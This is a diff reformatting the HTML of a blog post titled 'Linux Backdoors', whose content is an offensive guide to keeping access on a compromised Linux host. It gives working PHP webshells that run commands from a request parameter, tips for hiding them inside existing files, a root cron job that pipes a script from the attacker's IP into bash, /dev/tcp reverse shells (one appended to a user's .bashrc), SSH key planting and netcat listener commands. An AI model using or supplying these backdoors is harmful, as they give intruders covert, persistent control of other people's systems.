@@ -1,224 +1,288 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-  <head>
-    
-      <title>
-        Linux Backdoors ::
-        My website — A simple blog
-      </title>
-    
-    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta
-  name="description"
-  content="#Linux
+    <head>
+        <title>Linux Backdoors :: My website — A simple blog</title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta
+            name="description"
+            content="#Linux
 Types of linux backdoors
 "
-/>
-<meta
-  name="keywords"
-  content=""
-/>
-<meta name="robots" content="noodp" />
-<link rel="canonical" href="https://example.org/posts/linux-backdoors/" />
+        />
+        <meta name="keywords" content="" />
+        <meta name="robots" content="noodp" />
+        <link
+            rel="canonical"
+            href="https://example.org/posts/linux-backdoors/"
+        />
 
+        <link rel="stylesheet" href="/css/style.css" />
 
+        <link rel="stylesheet" href="https://example.org/style.css" />
 
+        <link
+            rel="apple-touch-icon-precomposed"
+            sizes="144x144"
+            href="https://example.org/img/apple-touch-icon-144-precomposed.png"
+        />
+        <link rel="shortcut icon" href="https://example.org/img/favicon.png" />
 
+        <link
+            href="/fonts/Inter-Italic.woff2"
+            rel="preload"
+            type="font/woff2"
+            as="font"
+            crossorigin=""
+        />
+        <link
+            href="/fonts/Inter-Regular.woff2"
+            rel="preload"
+            type="font/woff2"
+            as="font"
+            crossorigin=""
+        />
+        <link
+            href="/fonts/Inter-Medium.woff2"
+            rel="preload"
+            type="font/woff2"
+            as="font"
+            crossorigin=""
+        />
+        <link
+            href="/fonts/Inter-MediumItalic.woff2"
+            rel="preload"
+            type="font/woff2"
+            as="font"
+            crossorigin=""
+        />
+        <link
+            href="/fonts/Inter-Bold.woff2"
+            rel="preload"
+            type="font/woff2"
+            as="font"
+            crossorigin=""
+        />
+        <link
+            href="/fonts/Inter-BoldItalic.woff2"
+            rel="preload"
+            type="font/woff2"
+            as="font"
+            crossorigin=""
+        />
 
+        <meta name="twitter:card" content="summary" />
+        <meta name="twitter:title" content="Linux Backdoors" />
+        <meta
+            name="twitter:description"
+            content="#Linux
+Types of linux backdoors"
+        />
 
+        <meta property="og:title" content="Linux Backdoors" />
+        <meta
+            property="og:description"
+            content="#Linux
+Types of linux backdoors"
+        />
+        <meta property="og:type" content="article" />
+        <meta
+            property="og:url"
+            content="https://example.org/posts/linux-backdoors/"
+        />
+        <meta property="article:section" content="posts" />
+        <meta
+            property="article:published_time"
+            content="2023-12-23T18:12:17-05:00"
+        />
+        <meta
+            property="article:modified_time"
+            content="2023-12-23T18:12:17-05:00"
+        />
+        <meta property="og:site_name" content="Hello Friend" />
+    </head>
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+                <span class="header__inner">
+                    <a href="/" class="logo" style="text-decoration: none">
+                        <span class="logo__mark"
+                            ><svg
+                                xmlns="http://www.w3.org/2000/svg"
+                                class="greater-icon"
+                                viewBox="0 0 44 44"
+                            >
+                                <path
+                                    fill="none"
+                                    d="M15 8l14.729 14.382L15 35.367"
+                                />
+                            </svg>
+                        </span>
+                        <span class="logo__text">hello friend</span>
+                        <span class="logo__cursor"></span>
+                    </a>
 
-<link rel="stylesheet" href="/css/style.css" />
+                    <span class="header__right">
+                        <nav class="menu">
+                            <ul class="menu__inner menu__inner--desktop">
+                                <li><a href="/about">About</a></li>
+                            </ul>
 
-<link rel="stylesheet" href="https://example.org/style.css" />
+                            <ul class="menu__inner menu__inner--mobile">
+                                <li><a href="/about">About</a></li>
+                            </ul>
+                        </nav>
 
+                        <span class="menu-trigger">
+                            <svg
+                                xmlns="http://www.w3.org/2000/svg"
+                                viewBox="0 0 24 24"
+                            >
+                                <path d="M0 0h24v24H0z" fill="none" />
+                                <path
+                                    d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"
+                                />
+                            </svg>
+                        </span>
 
-<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://example.org/img/apple-touch-icon-144-precomposed.png" />
-<link rel="shortcut icon" href="https://example.org/img/favicon.png" />
-
-
-<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-
-
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Linux Backdoors"/>
-<meta name="twitter:description" content="#Linux
-Types of linux backdoors"/>
-
-
-
-<meta property="og:title" content="Linux Backdoors" />
-<meta property="og:description" content="#Linux
-Types of linux backdoors" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://example.org/posts/linux-backdoors/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2023-12-23T18:12:17-05:00" />
-<meta property="article:modified_time" content="2023-12-23T18:12:17-05:00" /><meta property="og:site_name" content="Hello Friend" />
-
-
-
-
-
-
-
-  </head>
-  <body class="dark-theme">
-    <div class="container">
-      <header class="header">
-  <span class="header__inner">
-    <a
-  href="/"
-  class="logo"
-  style="text-decoration: none;"
->
-  
-    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
-  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
-</svg>
-</span>
-    <span class="logo__text"
-      >hello friend</span
-    >
-    <span class="logo__cursor"></span>
-  
-</a>
-
-    <span class="header__right">
-      
-        <nav class="menu">
-  <ul class="menu__inner menu__inner--desktop">
-    
-      
-        
-          <li><a href="/about">About</a></li>
-        
-      
-      
-      
-  </ul>
-
-  <ul class="menu__inner menu__inner--mobile">
-    
-      
-        <li><a href="/about">About</a></li>
-      
-    
-  </ul>
-</nav>
-
-        <span class="menu-trigger">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-            <path d="M0 0h24v24H0z" fill="none" />
-            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
-          </svg>
-        </span>
-      
-      <span class="theme-toggle">
-        <svg
-  class="theme-toggler"
-  width="24"
-  height="24"
-  viewBox="0 0 48 48"
-  fill="none"
-  xmlns="http://www.w3.org/2000/svg"
->
-  <path
-    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+                        <span class="theme-toggle">
+                            <svg
+                                class="theme-toggler"
+                                width="24"
+                                height="24"
+                                viewBox="0 0 48 48"
+                                fill="none"
+                                xmlns="http://www.w3.org/2000/svg"
+                            >
+                                <path
+                                    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
-  />
-</svg>
+                                />
+                            </svg>
+                        </span>
+                    </span>
+                </span>
+            </header>
 
-      </span>
-    </span>
-  </span>
-</header>
+            <div class="content">
+                <article class="post">
+                    <h1 class="post-title">Linux Backdoors</h1>
+                    <div class="post-meta">
+                        <time class="post-date"> 2023-12-23 </time>
 
+                        <span class="post-read-time">— 3 min read</span>
+                    </div>
 
-      <div class="content">
-        
-  
-  
+                    <figure class="post-cover">
+                        <img
+                            src="/img/linux-backdoors/linux-backdoors.jpg"
+                            alt="Linux owo"
+                        />
+                    </figure>
 
-  <article class="post">
-    <h1 class="post-title">Linux Backdoors</h1>
-    <div class="post-meta">
-      
-        <time class="post-date">
-          2023-12-23
-        </time>
+                    <div class="post-content">
+                        <h2>Table of Contents</h2>
+                        <aside class="table-of-contents">
+                            <nav id="TableOfContents">
+                                <ul>
+                                    <li>
+                                        <a href="#ssh-backdoor">SSH backdoor</a>
+                                    </li>
+                                    <li>
+                                        <a href="#php-backdoor">PHP backdoor</a>
+                                    </li>
+                                    <li>
+                                        <a href="#cronjob-backdoor"
+                                            >CronJob backdoor</a
+                                        >
+                                    </li>
+                                    <li>
+                                        <a href="#bashrc-backdoor"
+                                            >.bashrc backdoor</a
+                                        >
+                                    </li>
+                                    <li>
+                                        <a href="#pam_unixso-backdoor"
+                                            >pam_unix.so backdoor</a
+                                        >
+                                    </li>
+                                </ul>
+                            </nav>
+                        </aside>
 
-        
-          
-        
-      
-
-      
-
-
-      
-        <span class="post-read-time"
-          >— 3 min read</span
-        >
-      
-    </div>
-
-    
-
-    
-      <figure class="post-cover">
-  
-    <img src="https://example.org/img/linux-backdoors/linux-backdoors.jpg" alt="Linux owo"/>
-  
-
-  
-</figure>
-
-    
-
-    <div class="post-content">
-      
-        
-        <h2>Table of Contents</h2>
-        <aside class="table-of-contents"><nav id="TableOfContents">
-  <ul>
-    <li><a href="#ssh-backdoor">SSH backdoor</a></li>
-    <li><a href="#php-backdoor">PHP backdoor</a></li>
-    <li><a href="#cronjob-backdoor">CronJob backdoor</a></li>
-    <li><a href="#bashrc-backdoor">.bashrc backdoor</a></li>
-    <li><a href="#pam_unixso-backdoor">pam_unix.so backdoor</a></li>
-  </ul>
-</nav></aside>
-        
-      
-      <p>#Linux</p>
-<p>Types of linux backdoors</p>
-<h2 id="ssh-backdoor">
-  SSH backdoor
-  <a href="#ssh-backdoor" class="h-anchor" aria-hidden="true">#</a>
-</h2>
-<p>The ssh backdoor essentially consists of leaving our ssh keys in some user’s home directory. Usually the user would be root as it’s the user with the highest privileges.</p>
-<p><code>ssh-keygen</code></p>
-<p>Now that we have 2 keys, 1 private key and 1 public key, we can navigate to /root/.ssh and leave our public key there. Don&rsquo;t forget to rename the public key to : authorized_keys</p>
-<blockquote>
-<p>Give the private key the right permissions: <code>chmod 600 id_rsa</code>
-Log in to the machine: <code>ssh -i id_rsa root@ip</code></p>
-</blockquote>
-<h2 id="php-backdoor">
-  PHP backdoor
-  <a href="#php-backdoor" class="h-anchor" aria-hidden="true">#</a>
-</h2>
-<ul>
-<li>If you get root access on a Linux host, you will most likely search for creds and or any useful information in the web root.</li>
-<li>The web root is usually located in : /var/www/html</li>
-<li>What you have to know is that, whatever you leave in /var/www/html, will be available for everybody to use in their browser.</li>
-<li>Simple php webshell that executes the command passed in the GET or POST cmd parameter</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+                        <p>#Linux</p>
+                        <p>Types of linux backdoors</p>
+                        <h2 id="ssh-backdoor">
+                            SSH backdoor
+                            <a
+                                href="#ssh-backdoor"
+                                class="h-anchor"
+                                aria-hidden="true"
+                                >#</a
+                            >
+                        </h2>
+                        <p>
+                            The ssh backdoor essentially consists of leaving our
+                            ssh keys in some user’s home directory. Usually the
+                            user would be root as it’s the user with the highest
+                            privileges.
+                        </p>
+                        <p><code>ssh-keygen</code></p>
+                        <p>
+                            Now that we have 2 keys, 1 private key and 1 public
+                            key, we can navigate to /root/.ssh and leave our
+                            public key there. Don&rsquo;t forget to rename the
+                            public key to : authorized_keys
+                        </p>
+                        <blockquote>
+                            <p>
+                                Give the private key the right permissions:
+                                <code>chmod 600 id_rsa</code> Log in to the
+                                machine: <code>ssh -i id_rsa root@ip</code>
+                            </p>
+                        </blockquote>
+                        <h2 id="php-backdoor">
+                            PHP backdoor
+                            <a
+                                href="#php-backdoor"
+                                class="h-anchor"
+                                aria-hidden="true"
+                                >#</a
+                            >
+                        </h2>
+                        <ul>
+                            <li>
+                                If you get root access on a Linux host, you will
+                                most likely search for creds and or any useful
+                                information in the web root.
+                            </li>
+                            <li>
+                                The web root is usually located in :
+                                /var/www/html
+                            </li>
+                            <li>
+                                What you have to know is that, whatever you
+                                leave in /var/www/html, will be available for
+                                everybody to use in their browser.
+                            </li>
+                            <li>
+                                Simple php webshell that executes the command
+                                passed in the GET or POST cmd parameter
+                            </li>
+                        </ul>
+                        <div class="highlight">
+                            <pre
+                                tabindex="0"
+                                style="
+                                    color: #f8f8f2;
+                                    background-color: #272822;
+                                    -moz-tab-size: 4;
+                                    -o-tab-size: 4;
+                                    tab-size: 4;
+                                "
+                            ><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>])){
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;&#34;</span>;
 </span></span><span style="display:flex;"><span>        $cmd <span style="color:#f92672">=</span> ($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
@@ -227,126 +291,237 @@ Log in to the machine: <code>ssh -i id_rsa root@ip</code></p>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>Another way to achieve the same thing</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span></span></code></pre>
+                        </div>
+                        <p>Another way to achieve the same thing</p>
+                        <div class="highlight">
+                            <pre
+                                tabindex="0"
+                                style="
+                                    color: #f8f8f2;
+                                    background-color: #272822;
+                                    -moz-tab-size: 4;
+                                    -o-tab-size: 4;
+                                    tab-size: 4;
+                                "
+                            ><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>])) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">shell_exec</span>($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>]) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/pre&gt;&#34;</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><blockquote>
-<p>Tips</p>
-<ol>
-<li>Try to add this piece of code in already existing php files in /var/www/html. Adding it more towards the middle of files will definitely make our malicious actions a little more secret.</li>
-<li>Change the &ldquo;cmd&rdquo; parameter to something else&hellip; anything actually&hellip; just change it to something that isn&rsquo;t that common. &ldquo;Cmd&rdquo; is really common and is already really well known in the hacking community.</li>
-</ol>
-</blockquote>
-<h2 id="cronjob-backdoor">
-  CronJob backdoor
-  <a href="#cronjob-backdoor" class="h-anchor" aria-hidden="true">#</a>
-</h2>
-<p>Once you got root access on any host, you can add any scheduled task in /etc/crontab. You could even just configure a task where every minute a reverse shell is sent to you. Which is exactly what we&rsquo;re going to do.</p>
-<p>Add this line into our cronjob file :</p>
-<p><code>* *     * * *   root    curl http://&lt;yourip&gt;:8080/shell | bash</code></p>
-<p>Notice that we put a <code>*</code> star symbol to everything. This means that our task will run every minute, every hour, every day, etc.</p>
-<p>We first use &ldquo;curl&rdquo; to download a file , and then we pipe it to &ldquo;bash&rdquo;</p>
-<p>The contents of the &ldquo;shell&rdquo; file that we are using are simply :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span></code></pre>
+                        </div>
+                        <blockquote>
+                            <p>Tips</p>
+                            <ol>
+                                <li>
+                                    Try to add this piece of code in already
+                                    existing php files in /var/www/html. Adding
+                                    it more towards the middle of files will
+                                    definitely make our malicious actions a
+                                    little more secret.
+                                </li>
+                                <li>
+                                    Change the &ldquo;cmd&rdquo; parameter to
+                                    something else&hellip; anything
+                                    actually&hellip; just change it to something
+                                    that isn&rsquo;t that common.
+                                    &ldquo;Cmd&rdquo; is really common and is
+                                    already really well known in the hacking
+                                    community.
+                                </li>
+                            </ol>
+                        </blockquote>
+                        <h2 id="cronjob-backdoor">
+                            CronJob backdoor
+                            <a
+                                href="#cronjob-backdoor"
+                                class="h-anchor"
+                                aria-hidden="true"
+                                >#</a
+                            >
+                        </h2>
+                        <p>
+                            Once you got root access on any host, you can add
+                            any scheduled task in /etc/crontab. You could even
+                            just configure a task where every minute a reverse
+                            shell is sent to you. Which is exactly what
+                            we&rsquo;re going to do.
+                        </p>
+                        <p>Add this line into our cronjob file :</p>
+                        <p>
+                            <code
+                                >* *     * * *   root    curl
+                                http://&lt;yourip&gt;:8080/shell | bash</code
+                            >
+                        </p>
+                        <p>
+                            Notice that we put a <code>*</code> star symbol to
+                            everything. This means that our task will run every
+                            minute, every hour, every day, etc.
+                        </p>
+                        <p>
+                            We first use &ldquo;curl&rdquo; to download a file ,
+                            and then we pipe it to &ldquo;bash&rdquo;
+                        </p>
+                        <p>
+                            The contents of the &ldquo;shell&rdquo; file that we
+                            are using are simply :
+                        </p>
+                        <div class="highlight">
+                            <pre
+                                tabindex="0"
+                                style="
+                                    color: #f8f8f2;
+                                    background-color: #272822;
+                                    -moz-tab-size: 4;
+                                    -o-tab-size: 4;
+                                    tab-size: 4;
+                                "
+                            ><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
 </span></span><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;<span style="color:#ae81ff">1</span>
-</span></span></code></pre></div><p>We would have to run an HTTP server serving our shell.</p>
-<p>You can achieve this by running : &ldquo;python3 -m http.server 8080&rdquo;</p>
-<p>Once our shell gets downloaded, it will be executed by &ldquo;bash&rdquo; and we would get a shell!</p>
-<p><em>Don&rsquo;t forget to listen on your specified port with &ldquo;nc -nvlp port&rdquo;</em></p>
-<h2 id="bashrc-backdoor">
-  .bashrc backdoor
-  <a href="#bashrc-backdoor" class="h-anchor" aria-hidden="true">#</a>
-</h2>
-<p>If a user has bash as their login shell, the &ldquo;.bashrc&rdquo; file in their home directory is executed when an interactive session is launched.</p>
-<p>So If you know any users that log on to their system quite often, you could simply run this command to include your reverse shell into their &ldquo;.bashrc&rdquo;.</p>
-<p><code>echo 'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1' &gt;&gt; ~/.bashrc</code></p>
-<h2 id="pam_unixso-backdoor">
-  pam_unix.so backdoor
-  <a href="#pam_unixso-backdoor" class="h-anchor" aria-hidden="true">#</a>
-</h2>
-<ul>
-<li><a href="https://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html">Creating a backdoor in pam</a></li>
-<li><a href="https://github.com/zephrax/linux-pam-backdoor">https://github.com/zephrax/linux-pam-backdoor</a></li>
-<li><a href="https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c">https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c</a></li>
-</ul>
-    </div>
-    
-      
-        <div class="pagination">
-          <div class="pagination__title">
-            <span class="pagination__title-h"
-              >Read other posts</span
-            >
-            <hr />
-          </div>
-          <div class="pagination__buttons">
-            
-              <span class="button previous">
-                <a href="https://example.org/posts/ice/">
-                  <span class="button__icon">←</span>
-                  <span class="button__text">Ice</span>
-                </a>
-              </span>
-            
-            
-          </div>
+</span></span></code></pre>
+                        </div>
+                        <p>
+                            We would have to run an HTTP server serving our
+                            shell.
+                        </p>
+                        <p>
+                            You can achieve this by running : &ldquo;python3 -m
+                            http.server 8080&rdquo;
+                        </p>
+                        <p>
+                            Once our shell gets downloaded, it will be executed
+                            by &ldquo;bash&rdquo; and we would get a shell!
+                        </p>
+                        <p>
+                            <em
+                                >Don&rsquo;t forget to listen on your specified
+                                port with &ldquo;nc -nvlp port&rdquo;</em
+                            >
+                        </p>
+                        <h2 id="bashrc-backdoor">
+                            .bashrc backdoor
+                            <a
+                                href="#bashrc-backdoor"
+                                class="h-anchor"
+                                aria-hidden="true"
+                                >#</a
+                            >
+                        </h2>
+                        <p>
+                            If a user has bash as their login shell, the
+                            &ldquo;.bashrc&rdquo; file in their home directory
+                            is executed when an interactive session is launched.
+                        </p>
+                        <p>
+                            So If you know any users that log on to their system
+                            quite often, you could simply run this command to
+                            include your reverse shell into their
+                            &ldquo;.bashrc&rdquo;.
+                        </p>
+                        <p>
+                            <code
+                                >echo 'bash -i &gt;&amp; /dev/tcp/ip/port
+                                0&gt;&amp;1' &gt;&gt; ~/.bashrc</code
+                            >
+                        </p>
+                        <h2 id="pam_unixso-backdoor">
+                            pam_unix.so backdoor
+                            <a
+                                href="#pam_unixso-backdoor"
+                                class="h-anchor"
+                                aria-hidden="true"
+                                >#</a
+                            >
+                        </h2>
+                        <ul>
+                            <li>
+                                <a
+                                    href="https://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html"
+                                    >Creating a backdoor in pam</a
+                                >
+                            </li>
+                            <li>
+                                <a
+                                    href="https://github.com/zephrax/linux-pam-backdoor"
+                                    >https://github.com/zephrax/linux-pam-backdoor</a
+                                >
+                            </li>
+                            <li>
+                                <a
+                                    href="https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c"
+                                    >https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c</a
+                                >
+                            </li>
+                        </ul>
+                    </div>
+
+                    <div class="pagination">
+                        <div class="pagination__title">
+                            <span class="pagination__title-h"
+                                >Read other posts</span
+                            >
+                            <hr />
+                        </div>
+                        <div class="pagination__buttons">
+                            <span class="button previous">
+                                <a href="/posts/ice/">
+                                    <span class="button__icon">←</span>
+                                    <span class="button__text">Ice</span>
+                                </a>
+                            </span>
+                        </div>
+                    </div>
+                </article>
+            </div>
+
+            <footer class="footer">
+                <div class="footer__inner">
+                    <a href="/" class="logo" style="text-decoration: none">
+                        <span class="logo__mark"
+                            ><svg
+                                xmlns="http://www.w3.org/2000/svg"
+                                class="greater-icon"
+                                viewBox="0 0 44 44"
+                            >
+                                <path
+                                    fill="none"
+                                    d="M15 8l14.729 14.382L15 35.367"
+                                />
+                            </svg>
+                        </span>
+                        <span class="logo__text">hello friend</span>
+                        <span class="logo__cursor"></span>
+                    </a>
+
+                    <div class="copyright">
+                        <span
+                            >© 2023 Powered by
+                            <a
+                                href="https://gohugo.io"
+                                target="_blank"
+                                rel="noopener"
+                                >Hugo</a
+                            ></span
+                        >
+                        <span
+                            ><a
+                                href="https://github.com/panr/hugo-theme-hello-friend"
+                                target="_blank"
+                                >Theme</a
+                            >
+                            made by
+                            <a href="https://github.com/panr" target="_blank"
+                                >panr</a
+                            ></span
+                        >
+                    </div>
+                </div>
+            </footer>
+
+            <script type="text/javascript" src="/bundle.min.js"></script>
         </div>
-      
-    
-
-    
-      
-        
-
-      
-    
-  </article>
-
-      </div>
-
-      
-        <footer class="footer">
-  <div class="footer__inner">
-    
-      <a
-  href="/"
-  class="logo"
-  style="text-decoration: none;"
->
-  
-    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
-  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
-</svg>
-</span>
-    <span class="logo__text"
-      >hello friend</span
-    >
-    <span class="logo__cursor"></span>
-  
-</a>
-
-      <div class="copyright">
-        <span>© 2023 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
-        <span><a href="https://github.com/panr/hugo-theme-hello-friend" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
-      </div>
-    
-  </div>
-</footer>
-
-
-
-
-
-<script type="text/javascript" src="/bundle.min.js"></script>
-
-
-      
-    </div>
-
-    
-  </body>
+    </body>
 </html>
